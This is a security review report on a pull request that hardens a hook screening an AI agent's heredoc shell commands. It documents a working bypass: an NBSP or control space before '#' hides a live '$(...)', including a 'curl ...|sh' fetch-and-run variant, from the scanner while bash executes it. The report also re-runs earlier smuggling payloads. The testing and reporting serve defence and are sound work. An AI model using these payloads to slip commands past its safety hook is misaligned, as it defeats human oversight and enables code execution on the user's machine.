# Security RE-VERIFICATION round 2 — #1958 heredoc classifier (incl. ANSI-C fix)

Re-verification of the full stack at HEAD `a2fae713a` (ANSI-C fix) on top of `224ed78b9`
(Finding-1 per-line-reset fix). Predecessors: `.lisa/security-review-1958.md` (Finding 1),
`.lisa/security-reverify-1958.md` (Finding R1, ANSI-C). Every payload was assembled from files
in Python (never inline in Bash), driven JSON-on-stdin through the REAL fanned hook
(`plugins/lisa/hooks/parity-safety-net.sh` → `parity-safety-net-heredoc.py`), and every ALLOWED
case was then executed under a sandboxed `/bin/bash` (v3.2.57, the same binary the hook's
`bash -n` gate uses) with `touch` sentinels. Harness under `/tmp/hd1958rv2/`
(`drive.py`, `execcheck.py`, `probe_ws.py`, `fuzz.py`, `fuzz2.py`, `fuzz3.py`, `gen_ws.py`).

## VERDICT: **VETO** — a THIRD, distinct, executable desync is live (Finding R2).

The ANSI-C and per-line-reset holes are genuinely closed, but a **whitespace-classification
desync** in the SAME shared quote/comment model yields a fresh, proven RCE: the hook exits 0
(ALLOWED) and real bash creates the sentinel.

---

## 1. Known reproducers re-run — ALL DEAD (fix holds) ✅

| id | payload | parser | hook | sentinel |
|----|---------|--------|------|----------|
| A2 | `echo "…<<'EOF'…$(touch)…"` | 20 MALFORMED | BLOCKED(2) | not created |
| A3 | `…$(curl…|sh)…` | 20 MALFORMED | BLOCKED(2) | — |
| A4 | `template="…"` wrapper | 20 MALFORMED | BLOCKED(2) | not created |
| R1 assign | `x=$'\''"…$(touch)…"` | 20 MALFORMED | BLOCKED(2) | not created |
| R1 echo | `echo $'\''"…"` (no assignment) | 20 MALFORMED | BLOCKED(2) | not created |
| R1 rm-pos | `x=$'\''"…$(touch)…"` | 20 MALFORMED | BLOCKED(2) | not created |

The ANSI-C model is now well-synced: a 30-spelling ANSI-C prefix sweep (`fuzz2.py`) and a
16-template feature-seam sweep (`fuzz.py`) produced **zero** bypasses — every payload bash
executes is caught at MALFORMED(20); the only parser=10 cases fail `bash -n` (blocked upstream).
A 63-case Unicode/control line-separator sweep (`fuzz3.py`, Finding-3 class, ANSI-C-assisted)
also produced zero bypasses.

---

## Security (proven)

### FINDING R2 — CRITICAL (VETO): `str.isspace()`-superset comment desync smuggles a live `$(...)` past the wall

`plugins/*/hooks/parity-safety-net-heredoc.py` — the shared comment-boundary test
`… (index == 0 or command[index - 1].isspace())` used by **has_active_command_substitution
(L405)**, `cross_line_quote_state` (L499), `top_level_markers` (L241), `shell_tokens` (L111),
and `unquoted_code_and_comment` (L292).

- **Root cause:** Python `str.isspace()` is a strict **superset** of bash's word-separator set.
  `str.isspace()` is `True` for `\xa0` (NBSP), `\x1c`–`\x1f` (FS/GS/RS/US), `\x85` (NEL),
  ` `–` `, ` `/` `, ` `, ` `, `　` (ideographic space) — none
  of which bash (C locale) treats as whitespace or a metacharacter. So when one of these bytes
  precedes a `#`, bash keeps `#` **inside the current word** (NOT a comment) and still performs
  command substitution on a `$(...)` in that word, while the scanner sees
  `command[index-1].isspace() == True`, treats the `#` as a **comment start, and skips to the
  next newline — going blind to the live substitution.** `has_active_command_substitution`
  returns `False`; the parser falls through to **UNSUPPORTED(10)**; the hook **exits 0**.

- **Reproducer** (`/tmp/hd1958rv2/pl/WS1`, executable end-to-end through the real hook). Bytes
  (note the `0xC2 0xA0` NBSP between `X` and `#`):
  ```
  cat <<'EOF'
  hello world
  EOF
  echo X #$(touch /tmp/hd1958rv2/sbx/WS1)
  ```
  Raw bytes: `b"cat <<'EOF'\nhello world\nEOF\necho X\xc2\xa0#$(touch …/WS1)\n"`.
  `bash -n` **PASS** → parser **exit 10 (UNSUPPORTED)** → hook **exit 0 (ALLOWED)** → running
  under `/bin/bash` **created the sentinel** (`bash_exec=True`, `bash_rc=0`): the `$(touch …)`
  really executed.

- **Confirmed across the desync class** (each ALLOWED by hook + sentinel created under bash):
  | id | separator byte before `#` | parser | hook | bash_exec |
  |----|---------------------------|--------|------|-----------|
  | WS1 | `\xa0` NBSP | 10 | ALLOWED(0) | **True** |
  | WS3 | `\xa0` NBSP (`true …#$(…)`) | 10 | ALLOWED(0) | **True** |
  | WS4 | `\x1c` FS | 10 | ALLOWED(0) | **True** |
  | WS5 | `　` ideographic space | 10 | ALLOWED(0) | **True** |
  | WS2p | `\xa0` + `$(touch && curl http://127.0.0.1:9/x.sh|sh)` | 10 | ALLOWED(0) | **True** (touch proxy fired; curl ran) |
  | **WSC** (control) | ordinary `0x20` space | 10 | ALLOWED(0) | **False** — bash comments it, scanner agrees, parity holds |
  The WSC control isolates the defect to the Unicode/control-space class: with a real space
  before `#`, bash and the scanner agree it is a comment and nothing executes.

- **Why the fix does not stop it:** the ANSI-C fix taught the shared model `$'…'`, but the
  comment-boundary predicate was untouched and is **independently** wrong for the same
  structural reason the ANSI-C hole was — the scanner's model of a bash lexical boundary
  diverges from bash. A perfect ANSI-C/strip gate cannot save an active-substitution scanner
  that classifies `#` as a comment where bash does not.

- **Delta / provenance:** this is a **pre-existing** member of the RCE class (the `isspace()`
  idiom predates #1958), orthogonal to Finding 1 and R1, that neither the regression nor either
  fix touched. It is in scope: merging as "RCE fixed" ships a live RCE in the exact class the PR
  claims to wall off. `cross_line_quote_state` (the strip gate) shares the same predicate, so a
  body-window variant of this class is reachable too.

- **Impact:** an arbitrary expanding `$(…)` / `` `…` `` executes while the hook reports the
  command safe — RCE / exfil (`$(curl …|sh)`, WS2p) appended to ANY heredoc command. `$(touch)`
  and `$(curl|sh)` are unguarded by the content rules, so the wall is the only defense and it is
  blind. Per predecessor Finding 2, `$(rm …)` inside double quotes is also guard-blind, so the
  destructive shape is not reliably backstopped either. Precondition is only "the agent emits
  this string," which is the guard's whole threat model. A single NBSP/FS/ideographic-space byte
  before `#` is trivially reachable — it is exactly the kind of stray Unicode an LLM emits, and
  invisible in most editors/logs.

- **reason:** reproducer (bash executed the sentinel end-to-end through the real hook, with an
  ordinary-space control proving parity elsewhere) + bounded impact (arbitrary substitution in
  any heredoc command via one Unicode/control space) + shared-predicate root cause across five
  walkers.

**Fix direction (not applied):** replace `str.isspace()` in the comment-boundary test with an
explicit bash whitespace set (`c in " \t"` for the intra-line case; a leading-position/metachar
check as appropriate) in the single shared home, so every walker's comment model matches bash's
word-boundary rule. Add WS1/WS4/WS5 (NBSP / FS / ideographic-space before `#$(…)`) as RED
fixtures and the ordinary-space WSC as the positive control.

---

## Security checklist
- [x] Input validation at boundary present (heredoc parser + `bash -n`)…
- [ ] …but the parser's **comment/word-boundary model disagrees with bash** (Finding R2). **FAIL.**
- [x] No secrets in code or logs · [x] auth N/A · [x] no injection introduced · [x] no deps added

## Attack surface swept clean (no ALLOWED+executed) this round
ANSI-C adjacency to `"`/`'`/`` ` ``, `$'…'` spanning line-continuations, nested `$'…$(…)…'`,
`$'` inside single/double quotes, `$"…"` locale quoting, backtick vs `$()`, here-string `<<<`,
`$(( ))`, `<<-` tab-dash + ANSI-C, and the full Unicode/control **line-separator** matrix
(`\r \x0b \x0c \x1c \x1d \x1e \x85    `) in seven fake-heredoc templates — all BLOCKED
at MALFORMED(20) whenever bash executed. Over-block check: gh-writer literal body with
apostrophes + backticks + `$(` (exit 0 SAFE) and legit `$'\t'` separator (exit 10) both remain
ALLOWED — no new false positive from the ANSI-C fix. **Only the `isspace()` comment desync (R2)
produced ALLOWED + executed.**

## Recommendations
- **CRITICAL / VETO** — do not merge as "RCE fixed." R2 ships a live RCE in the same class.
  Narrow the comment-boundary predicate to bash's actual whitespace set in the shared model.
- **WARNING** — predecessor Finding 2 (content guards miss `$(…)` in double quotes) remains the
  reason R2 is CRITICAL rather than defence-in-depth-contained; keep that follow-up ticket.
- The A2/A3/A4 (per-line reset) and R1 (ANSI-C) fixes are sound and should be retained; R2 is an
  additional, independent hole in the same wall.

### Reproducers (under `/tmp/hd1958rv2/`)
| id | file | parser | hook | bash_exec | class |
|----|------|--------|------|-----------|-------|
| WS1 | pl/WS1 | 10 | **ALLOWED(0)** | **True** | **VETO — RCE live (NBSP)** |
| WS4 | pl/WS4 | 10 | **ALLOWED(0)** | **True** | VETO (FS 0x1c) |
| WS5 | pl/WS5 | 10 | **ALLOWED(0)** | **True** | VETO (ideographic space) |
| WS2p | pl/WS2p | 10 | **ALLOWED(0)** | **True** | VETO (curl|sh exfil shape) |
| WSC | pl/WSC | 10 | ALLOWED(0) | False | control — parity holds w/ real space |
| A2/A3/A4 | pl/A2… | 20 | BLOCKED(2) | — | Finding 1 fixed ✓ |
| R1 * | pl/R1_* | 20 | BLOCKED(2) | — | Finding R1 fixed ✓ |
| L1/L2 | pl/L1,L2 | 0/10 | ALLOWED(0) | — | legit preserved ✓ |
